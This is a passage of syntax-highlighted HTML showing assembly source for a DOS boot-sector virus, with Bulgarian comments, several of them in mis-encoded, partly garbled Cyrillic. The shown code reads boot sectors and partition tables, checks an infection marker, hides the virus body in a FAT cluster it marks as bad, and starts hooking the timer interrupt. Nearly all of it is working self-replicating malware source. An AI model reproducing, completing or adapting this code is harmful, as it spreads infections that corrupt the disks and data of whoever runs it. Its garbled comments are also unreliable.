    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
</span><span class="sc5">D7D2A</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">D7D2C</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">c800_SEG</span><span class="sc0">        </span><span class="sc1">;С▓а░▓и░а и▒▓ин▒ки┐▓ INT 13</span><span class="sc0">



</span><span class="sc1">;================================================================;</span><span class="sc0">
</span><span class="sc1">;   ВЪЗПРОИЗВЕЖДАНЕ НА ВИРУСА И ЗАРАЗЯВАНЕ НА ПРОГРАМА   ;</span><span class="sc0">
</span><span class="sc1">;================================================================;</span><span class="sc0">
</span><span class="sc5">L7D2E</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">        </span><span class="sc1">;Че▓е BOOT sector о▓ ди▒ка</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">; BX = ?????????????????????? к║де, бе!</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">L7CC3</span><span class="sc0">

    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF8</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">  </span><span class="sc1">;HARD DISK?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">L7D63</span><span class="sc0">           </span><span class="sc1">;не</span><span class="sc0">

    </span><span class="sc1">;---- HARD DISK ----;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">81BEh</span><span class="sc0">        </span><span class="sc1">;Т║░▒и DOS partition</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0004h</span><span class="sc0">
</span><span class="sc5">L7D46</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">L7D58</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">L7D58</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,+</span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">L7D46</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">             </span><span class="sc1">;н┐ма DOS partition, не за░аз┐ва</span><span class="sc0">

    </span><span class="sc1">;---- Наме░ен е DOS partition ----;</span><span class="sc0">
</span><span class="sc5">L7D58</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">L7CC3</span><span class="sc0">           </span><span class="sc1">;Че▓е BOOT sector о▓ DOS partition</span><span class="sc0">

    </span><span class="sc1">;---- Т│к идва ако е ди▒ке▓а, п░о╖е▓ен е BOOT sector ----;</span><span class="sc0">
</span><span class="sc5">L7D63</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">8002h</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">D7C02</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">001Ch</span><span class="sc0">
    </span><span class="sc6">REPZ</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">          </span><span class="sc1">;ме▒▓и BPB ▓абли╢а▓а о▓ BOOT sector</span><span class="sc0">

    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D8000</span><span class="sc4">+</span><span class="sc2">01FCh</span><span class="sc4">,</span><span class="sc2">1357h</span><span class="sc0">    </span><span class="sc1">;За░азен ли е ди▒ка?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">L7D8B</span><span class="sc0">           </span><span class="sc1">;не</span><span class="sc0">

    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D8000</span><span class="sc4">+</span><span class="sc2">01FBh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">    </span><span class="sc1">;К║де ли ▒о╖и DS?</span><span class="sc0">
    </span><span class="sc6">JNC</span><span class="sc0"> </span><span class="sc5">L7D8A</span><span class="sc0">

    </span><span class="sc1">;---- Ди▒ка е за░азен ----;   ;---- Т│к май н┐ма да дойде никога? ----;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D8000</span><span class="sc4">+</span><span class="sc2">01F5h</span><span class="sc0">     </span><span class="sc1">;Божа ░або▓а...</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF5</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D8000</span><span class="sc4">+</span><span class="sc2">01F9h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">L7E92</span><span class="sc0">

</span><span class="sc5">L7D8A</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">RET</span><span class="sc0">



</span><span class="sc1">;-------------------</span><span class="sc0">
</span><span class="sc1">;   ДИСКА НЕ Е ЗАРАЗЕН, ПОЧВА ЗАРАЗЯВАНЕТО</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L7D8B</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D8000</span><span class="sc4">+</span><span class="sc2">000Bh</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0">  </span><span class="sc1">;Това не е ин▓е░е▒но</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">L7D8A</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D8000</span><span class="sc4">+</span><span class="sc2">000Dh</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">JC</span><span class="sc0">  </span><span class="sc5">L7D8A</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D8000</span><span class="sc4">+</span><span class="sc2">000Eh</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D8000</span><span class="sc4">+</span><span class="sc2">0010h</span><span class="sc0">
    </span><span class="sc6">CBW</span><span class="sc0">
    </span><span class="sc6">MUL</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D8000</span><span class="sc4">+</span><span class="sc2">0016h</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0020h</span><span class="sc0">
    </span><span class="sc6">MUL</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D8000</span><span class="sc4">+</span><span class="sc2">0011h</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">01FFh</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0">
    </span><span class="sc6">DIV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF5</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7C13</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF5</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7C0D</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc8">BH</span><span class="sc0">
    </span><span class="sc6">DIV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF7</span><span class="sc4">,</span><span class="sc2">0FBh</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0FF0h</span><span class="sc0">
    </span><span class="sc6">JBE</span><span class="sc0"> </span><span class="sc5">L7DE0</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF7</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">L7DE0</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7C0E</span><span class="sc0">
    </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF3</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7EB2</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">L7E00</span><span class="sc0">

</span><span class="sc5">D7DF3</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">D7DF5</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">000Ch</span><span class="sc0">
</span><span class="sc5">D7DF7</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">;▒▓а▓│▒-бай▓:</span><span class="sc0">
                </span><span class="sc1">;  0000 0001 - ▒▓а░▓и░ано е в║зп░оизвеждане</span><span class="sc0">
                </span><span class="sc1">;  0000 0010 - зака╖ен е на INT 08</span><span class="sc0">
                </span><span class="sc1">;  0000 0100</span><span class="sc0">
</span><span class="sc5">D7DF8</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">00</span><span class="sc0">  </span><span class="sc1">;│▒▓░ой▒▓во: 0 - A:, 1 - B:, ...</span><span class="sc0">
</span><span class="sc5">D7DF9</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">274h</span><span class="sc0">    </span><span class="sc1">;логи╖е▒ки ▒ек▓о░, к║де▓о е запи▒ано п░од║лжение▓о</span><span class="sc0">


    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">00</span><span class="sc0">

    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">1357h</span><span class="sc0">       </span><span class="sc1">;ИНДИКАТОР ЗА ЗАРАЗЕН ДИСК!!!!!!!!</span><span class="sc0">

    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0AA55h</span><span class="sc0">      </span><span class="sc1">;но░мален BOOT ▒ек▓о░</span><span class="sc0">


</span><span class="sc1">;***********************************************************;</span><span class="sc0">
</span><span class="sc1">;      ВТОРИ СЕКТОР - ПРОДЪЛЖЕНИЕ НА ВИРУСА         ;</span><span class="sc0">
</span><span class="sc1">;    НАМИРА СЕ НА bad sector НАВЪТРЕ В ДИСКА        ;</span><span class="sc0">
</span><span class="sc1">;***********************************************************;</span><span class="sc0">
</span><span class="sc5">L7E00</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF3</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF3</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7EB2</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">L7C9D</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">L7E4B</span><span class="sc0">
</span><span class="sc5">L7E12</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF7</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">L7E1D</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc5">L7E1D</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MUL</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7EB2</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">01FFh</span><span class="sc0">
    </span><span class="sc6">JNC</span><span class="sc0"> </span><span class="sc5">L7E00</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D8000</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF7</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">L7E45</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">L7E42</span><span class="sc0">
    </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
</span><span class="sc5">L7E42</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
</span><span class="sc5">L7E45</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">L7E51</span><span class="sc0">
</span><span class="sc5">L7E4B</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
    </span><span class="sc6">JBE</span><span class="sc0"> </span><span class="sc5">L7E12</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">L7E51</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0FFF7h</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF7</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">L7E68</span><span class="sc0">
    </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">L7E68</span><span class="sc0">
    </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
</span><span class="sc5">L7E68</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D8000</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">L7C98</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7C0D</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc8">BH</span><span class="sc0">
    </span><span class="sc6">MUL</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF5</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">L7C9D</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">L7C98</span><span class="sc0">

</span><span class="sc5">L7E92</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF9</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0020h</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">L7C98</span><span class="sc0">

    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0040h</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">L7C98</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">D7EB0</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0EEF0h</span><span class="sc0">
</span><span class="sc5">D7EB2</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;=======================================================;</span><span class="sc0">
</span><span class="sc1">;   ЗАКАЧВАНЕ ЗА int 08, АКО НЕ Е ЗАКАЧЕНА      ;</span><span class="sc0">
</span><span class="sc1">;=======================================================;</span><span class="sc0">
</span><span class="sc5">L7EB3</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF7</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">L7EDE</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7DF7</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">

    </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">BIOS_SEG</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">        </span><span class="sc1">;Зака╖ва ▒е на INT 8</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D0020</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D0022</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D0020</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewINT08</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D0022</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">
